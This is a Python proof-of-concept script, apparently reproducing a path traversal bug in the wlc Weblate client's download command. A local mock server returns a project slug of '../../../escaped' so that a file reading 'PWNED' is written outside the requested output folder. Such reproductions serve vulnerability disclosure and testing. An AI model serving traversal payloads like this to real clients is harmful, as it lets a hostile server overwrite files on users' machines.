import json, os, tempfile, threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from io import StringIO
from wlc.main import main

class H(BaseHTTPRequestHandler):
    def log_message(self, *a): pass
    def do_GET(self):
        base = f"http://127.0.0.1:{self.server.server_port}/api/"
        comp = {"url": base + "components/p/c/", "slug": "c", "name": "c",
                "project": {"url": base + "projects/p/", "slug": "../../../escaped", "name": "p"},
                "repository_url": base + "components/p/c/repository/"}
        if self.path.startswith("/api/components/p/c/file/"):
            body = b"PWNED"
        elif self.path == "/api/components/":
            body = json.dumps({"results": [comp], "next": None}).encode()
        else:
            body = b"{}"
        self.send_response(200); self.end_headers(); self.wfile.write(body)

srv = HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()
root = tempfile.mkdtemp()
out = os.path.join(root, "x", "y", "out")
main(args=["--url", f"http://127.0.0.1:{srv.server_port}/api/", "download", "-o", out], stdout=StringIO(), settings=())
for dp, _, fs in os.walk(root):
    for f in fs: print(os.path.join(dp, f))
